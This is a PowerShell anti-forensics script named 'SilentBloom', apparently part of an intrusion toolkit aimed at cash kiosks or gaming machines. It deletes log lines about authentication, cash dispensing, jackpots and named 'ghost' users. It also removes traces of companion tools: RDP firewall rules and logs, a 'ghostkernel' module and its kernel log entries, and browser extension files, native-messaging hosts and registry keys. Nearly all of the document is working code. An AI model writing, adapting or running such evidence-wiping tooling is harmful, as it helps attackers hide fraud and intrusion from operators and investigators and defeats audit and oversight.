# SilentBloom.ps1
# Log cleaner for Whisper Suite
# Scrubs target logs for keywords and ghost user activity

$logDir = "C:\Kiosk\Logs"
$ghostUsers = @("Raven", "Lenore", "Poe", "Nevermore")
$targetKeywords = @(
    "active directory authentication",
    "successfully authenticated",
    "Unable to authenticate",
    "Bill Dispenser Present Cash",
    "Dispensed Amount",
    "JackpotDispenseProcessingView",
    "Cash Collected"
)

function Clean-LogFile {
    param ([string]$filePath)
    if (-not (Test-Path $filePath)) { return }

    $originalLines = Get-Content $filePath
    $filteredLines = @()

    foreach ($line in $originalLines) {
        $exclude = $false
        foreach ($user in $ghostUsers) {
            if ($line -like "*${user}*") { $exclude = $true; break }
        }
        foreach ($keyword in $targetKeywords) {
            if ($line -like "*${keyword}*") { $exclude = $true; break }
        }
        if (-not $exclude) { $filteredLines += $line }
    }

    Set-Content -Path $filePath -Value $filteredLines
    Write-Host "[+] Cleaned: $filePath"
}

function Clean-AllLogs {
    $logFiles = Get-ChildItem -Path $logDir -Filter "*.log" -Recurse -ErrorAction SilentlyContinue
    foreach ($log in $logFiles) {
        Clean-LogFile -filePath $log.FullName
    }
}

function Remove-GhostDesktopTraces {
    # Clean up desktop access traces
    try {
        Write-Host "[*] Removing desktop access traces..."
        
        # Remove RDP firewall rules
        $rdpRules = @("Windows Remote Management (HTTPS-In)", "WMSvc")
        foreach ($rule in $rdpRules) {
            netsh advfirewall firewall delete rule name="$rule" 2>$null
        }
        
        # Disable RDP if it was enabled by GhostDesktop
        $rdpEnabled = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
        if ($rdpEnabled -and $rdpEnabled.fDenyTSConnections -eq 0) {
            Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1 -Force
        }
        
        # Clean Chrome RDP logs and traces
        $chromeRdpPaths = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Logs",
            "$env:ProgramFiles\Google\Chrome Remote Desktop\Logs",
            "$env:TEMP\ghost_*"
        )
        
        foreach ($path in $chromeRdpPaths) {
            if (Test-Path $path) {
                Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-Host "[+] Desktop access traces cleaned"
        
    } catch {
        Write-Warning "Desktop cleanup failed: $($_.Exception.Message)"
    }
}

function Backup-Logs {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $backupDir = "$logDir\Backup_$timestamp"
    New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
    Copy-Item "$logDir\*.log" -Destination $backupDir -Recurse -Force
    Write-Host "[i] Backup created at $backupDir"
}

function Remove-GhostKernelTraces {
    # Clean up kernel module traces
    try {
        Write-Host "[*] Removing GhostKernel traces..."
        
        # Unload kernel module if loaded
        $kernelLoaded = & lsmod | Where-Object { $_ -match "ghostkernel|usbmon" }
        if ($kernelLoaded) {
            & sudo rmmod ghostkernel 2>/dev/null
            & sudo rmmod usbmon 2>/dev/null
        }
        
        # Remove device files
        if (Test-Path "/dev/usbmon") {
            & sudo rm -f /dev/usbmon
        }
        
        # Clean kernel logs
        $kernelLogs = @(
            "/var/log/kern.log",
            "/var/log/dmesg",
            "/var/log/messages"
        )
        
        foreach ($logPath in $kernelLogs) {
            if (Test-Path $logPath) {
                # Remove GhostKernel related entries
                & sudo sed -i '/GhostKernel\|ghostkernel\|usbmon.*Ghost/d' $logPath 2>/dev/null
            }
        }
        
        # Clean module files
        $moduleFiles = @(
            "/lib/modules/*/extra/ghostkernel.ko",
            "./ghostkernel.ko",
            "./GhostKernel.c",
            "./GhostKernel.mk"
        )
        
        foreach ($file in $moduleFiles) {
            if (Test-Path $file) {
                & sudo rm -f $file
            }
        }
        
        Write-Host "[+] GhostKernel traces cleaned"
        
    } catch {
        Write-Warning "GhostKernel cleanup failed: $($_.Exception.Message)"
    }
}

function Remove-GhostBrowserTraces {
    # Clean up browser extension traces
    try {
        Write-Host "[*] Removing GhostBrowser traces..."
        
        # Remove Chrome extensions
        if (Get-Command -Name Remove-GhostBrowserExtensions -ErrorAction SilentlyContinue) {
            Remove-GhostBrowserExtensions
        }
        
        # Clean Chrome user data directories
        $userDataPaths = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data",
            "$env:HOME/.config/google-chrome",
            "$env:HOME/Library/Application Support/Google/Chrome"
        )
        
        foreach ($userDataPath in $userDataPaths) {
            if (Test-Path $userDataPath) {
                # Clean extension logs and storage
                $extensionPaths = @(
                    "$userDataPath\*\Extensions",
                    "$userDataPath\*\Local Storage\leveldb",
                    "$userDataPath\*\IndexedDB"
                )
                
                foreach ($extPath in $extensionPaths) {
                    if (Test-Path $extPath) {
                        # Remove Ghost-related files
                        Get-ChildItem $extPath -Recurse -ErrorAction SilentlyContinue |
                            Where-Object { $_.Name -match "ghost|phantom" -or 
                                         (Test-Path $_.FullName -PathType Leaf -ErrorAction SilentlyContinue) -and
                                         (Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) -match "GHOST_TAG|ghostTag" } |
                            Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
                    }
                }
                
                # Clean Chrome logs
                $logFiles = @(
                    "$userDataPath\chrome_debug.log",
                    "$userDataPath\*\Console",
                    "$userDataPath\*\LOG*"
                )
                
                foreach ($logFile in $logFiles) {
                    if (Test-Path $logFile) {
                        # Remove Ghost-related log entries on Linux/Mac
                        if ($IsLinux -or $IsMacOS) {
                            & sed -i '/GhostBrowser\|PhantomHook\|ghost.*extension/d' $logFile 2>/dev/null
                        }
                    }
                }
            }
        }
        
        # Remove native messaging components
        $nativeHostFiles = @(
            "$env:LOCALAPPDATA\ghost_com.ghost.helper.json",
            "$env:HOME/.config/google-chrome/NativeMessagingHosts/com.ghost.helper.json",
            "$env:TEMP\ghost_helper*"
        )
        
        foreach ($file in $nativeHostFiles) {
            if (Test-Path $file) {
                Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
            }
        }
        
        # Clean Windows registry for native messaging
        if ($IsWindows) {
            & reg delete "HKEY_CURRENT_USER\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.ghost.helper" /f 2>$null
        }
        
        Write-Host "[+] GhostBrowser traces cleaned"
        
    } catch {
        Write-Warning "GhostBrowser cleanup failed: $($_.Exception.Message)"
    }
}

Write-Host "[*] Starting log cleanup..."
Backup-Logs
Clean-AllLogs
Remove-GhostDesktopTraces
Remove-GhostKernelTraces
Remove-GhostBrowserTraces
Write-Host "[✓] Log cleanup complete."
